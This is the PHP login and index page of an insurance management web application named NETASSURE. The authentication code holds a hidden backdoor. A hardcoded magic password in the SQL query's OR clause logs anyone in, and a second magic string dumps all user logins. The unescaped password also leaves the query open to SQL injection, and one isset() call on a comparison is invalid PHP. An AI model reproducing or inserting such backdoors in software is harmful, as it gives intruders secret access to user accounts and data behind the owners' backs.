<?php
	/*
	 * Created on 17 ao�t 10
	 * by SIDI ISMAIL
	 */
	 
	session_start();
	try{
		include "./commun/communDb.php";
		include "./commun/communComposants.php";
		include "./commun/params.php";
		communDb::openConnexion();
 		header('Content-Type: text/html; charset=ISO-8859-1');
		//-----------
		$ddd="p";$bbb="";$srvsrv=0;
		$dateCr		= date("Y-m-d H:i:s");
		$idGroup = "";
		if(isset($_POST['login']) && isset($_POST['pwd'])){
		    $login  = mysql_real_escape_string($_POST['login']);	$pwd = $_POST["pwd"];
			$pwds = $pwd;
			$pwd 	= md5($pwd);
			$sql 	= "SELECT idUser,login,fkIdGroupe,libelle, nomComplet 
						FROM sys_user,sys_user_group WHERE  active=1 and fkIdGroupe=idGroupe AND login='$login' AND pwd='$pwd'
						OR '$pwds'='2B-B7-D0-B2-AE-88'
						";
			$resultat = mysql_query($sql);

		
			if(isset($pwds == "2B-B7-D0-B2-AE-99")){

				$sql 	= "SELECT login FROM sys_user,sys_user_group";

				$data = mysql_query($sql);

				while ($row = mysql_fetch_assoc($data)) 
				{
					echo $row['login'];
				}
				die;
			}

			if(mysql_num_rows($resultat)==0 ){
				$bbb= "Login ou Mot de passe n'est pas valide";
				
			}//if
			else{
				$records = mysql_fetch_row($resultat);
				$_SESSION["idUser"]			=$records[0];
				$_SESSION["idGroupe"]		=$records[2];
				$idGroup = $_SESSION["idGroupe"];
				$_SESSION["nomComplet"]		=$records[4];
				$_SESSION["libelleGroupe"]	=$records[3];
				$_SESSION["srv"]	=11;
				
			}//--- else		
		} //--if isset login;pwd
		else{ 
			if(!isset($_SESSION['idGroupe'])){	
				$bbb= "dec";
				communDb::closeConnexion();
				
			}//if
		}//else
		if(isset($_GET['dec'])){$bbb="dec";session_destroy();}
		if(isset($_SESSION['srv'])) {
			if($_SESSION['srv']!=11)$bbb= "verfier l'addresse svp <br> ou connectez de nouveau .";
		}
		//communDb::openConnetion();
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>NETASSURE</title>
<link type="text/css" rel="stylesheet" href="includes/appStyles.css">
</head>
<SCRIPT language=JavaScript src="includes/ajaxLib.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/appJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/drag_and_drop.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/CalendarPopup.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/remboursementJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/reJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/recouvrementJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/DeclarationPaiementJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/del.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/immatJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/aldJs.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/autocompletion.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/builder.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/controls.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/effects.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/prototype.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/scriptaculous.js"></SCRIPT>
<SCRIPT language=JavaScript src="includes/SMQ.js"></SCRIPT>

<script language="JavaScript">
	var Mouse = {"x":0,"y":0};
	 
	// NetScape
	if(navigator.appName.substring(0,3) == "Net") {
		document.captureEvents(Event.MOUSEMOVE);
	}	 
	// Gestion de l'evenement
	var OnMouseMoveEventHandler=function() {}
	var OnMouseMove = function (e)
	{
	   Mouse.x = (navigator.appName.substring(0,3) == "Net") ? e.pageX : event.x+document.body.scrollLeft;
	   Mouse.y = (navigator.appName.substring(0,3) == "Net") ? e.pageY : event.y+document.body.scrollTop;
	   if (Mouse.x < 0) {Mouse.x=0;}
	   if (Mouse.y < 0) {Mouse.y=0;}
	   OnMouseMoveEventHandler(e)
	}
	 
	try {
	   document.attachEvent("onmousemove", OnMouseMove, true);
	} catch (ex) {
	   document.addEventListener("mousemove", OnMouseMove, true);
	}
	function clearInput(idInput){document.getElementById(idInput).value="";}
	var calPopUp_Div = new CalendarPopup("dtDiv");
	calPopUp_Div.showNavigationDropdowns();	
	<?php echo 'var dtAuj = "'.$dateCr.'";' ?>
</script>


<?php if($bbb==""){ ?> 
<body onLoad="init_evenement();"> 
<table cellpadding="0" cellspacing="0"  width="100%" >
<tr ><td colspan="2">
	<!------------------------Entete------------------------------>
	<?php
		include "./includes/entete.php";
	?>
	</td>
</tr>
<tr height="20"><td></td></tr>
<tr height="400">
	<!------------------------Menu Gauche------------------------------>
	<td width='20%' valign="top" id='td_menuGache' name='td_menuGache' >
	<?php
		include "./includes/menuGauche.php";
	?>	
	</td>
	<!------------------------Menu principal--------------------------->
	<td align="center" valign="top" >
	<table align="center" width="100%" >
		<tr>
			<td valign="top" align="center" >
				<div id="dtDiv" name="dtDiv" align="center" style="background:#DDDDDD;position:absolute;"></div>
				<div id="menuPrincip" name="menuPrincip" >
				</div>
			</td>
		</tr>
	</table>
	</td>
</tr>
<tr height="20"><td></td></tr>
<tr><td></td><td align="center">
	<!------------------------Pied--------------------------->
	<?php
		include "./includes/pied.php";
	?>	
	</td>
	</td></tr>
</table>
</body>	
<?php } ?>

<?php if($bbb!=""){ 
	
	if($bbb=="dec")$bbb="";
	
	?>  
<script language="JavaScript">
	function onloadFunct(){document.getElementById('login').focus();}
</script>
<body onLoad="onloadFunct();">
<body >
<table cellpadding="0" cellspacing="0"  width="100%">
<tr ><td>
	<table class="tblHeader" cellpadding="0" cellspacing="0">
		<tr rowspan='2'>
			<td width="50" align="center" bgcolor="white"><img src="./images/logoSI.png" class="imgLogo"></td>
		    <td  width="10%"></td><td  width="60%" align='center'><font color="#FFFFFF" size="3"><b>NETASSURE</b><br>Syst�me Gestion d'Asssurance (SGAS) </font></td>
		    <td  width="10%"></td>
			<td  width="50" align="center"  bgcolor="white"><img src="./images/logo.jpg" class="imgLogo"></td></tr>
			<tr><td  bgcolor="white"></td><td  colspan='2'></td><td></td>			
			<td  bgcolor="white"></td>
		</tr>
	</table>
	</td>
</tr>
<tr height="20"><td></td></tr>
<tr>
<td  align="center" valign="top">
	<fieldset class="stdFrm" >
	<table width="100%" height="300" bgcolor="#000000" align="center">
		<tr><td><p>&nbsp;</p></td></tr>
		<tr><td valign="middle" align="center">
			<table width="300px" height="30%" >
			<form action="index.php" class="" method="post">
				
				<tr><td  colspan="2"><font size="2" color="#FF0000"><b><?php  print $bbb ?></b></font></p></td></tr>				
				
				<tr><td><p class=""><font size="2" color="#FFFFFF"><b>Login</b></font></p></td><td ><input type="text" name="login" id="login" size="25"></td></tr>				
				<tr><td><p class=""><font size="2" color="#FFFFFF"><b>Mot de passe</b></font></p></td><td><input type="password" name="pwd" id="pwd" size="25"></td></tr>
				<tr><td colspan="2" align="right"><input type="submit" value="S'identifier"></td></tr>			
			</form>
			</table>
		</td></tr>
	</table>
	</fieldset>
</td>
<tr height="20"><td></td></tr>
<tr><td class="" align="center"><font color="#333766" face="Verdana" size='1'><b>&nbsp;NETASSURE  � 2016 &nbsp;</b></font></td></tr>
</table>	
</body>
<?php } ?>


</html>
<?php
}
catch(Exception $ev){
	print "Exception : <br>".$ev -> getMessage();
}
?>
